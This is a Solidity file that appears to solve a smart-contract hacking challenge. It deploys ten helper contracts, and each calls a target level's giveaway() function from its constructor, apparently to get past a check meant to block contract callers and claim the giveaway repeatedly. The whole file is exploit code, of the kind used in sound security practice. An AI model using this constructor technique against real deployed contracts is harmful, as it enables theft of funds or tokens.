// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface LevelInterface {
    function giveaway() external;
}

contract SolutionContract {
    constructor(address _target) {
        LevelInterface level = LevelInterface(_target);
        level.giveaway();
    }
}

contract Solution {
    constructor(address _target) {
        for (uint256 i = 0; i < 10; i++) {
            new SolutionContract(_target);
        }
    }
}
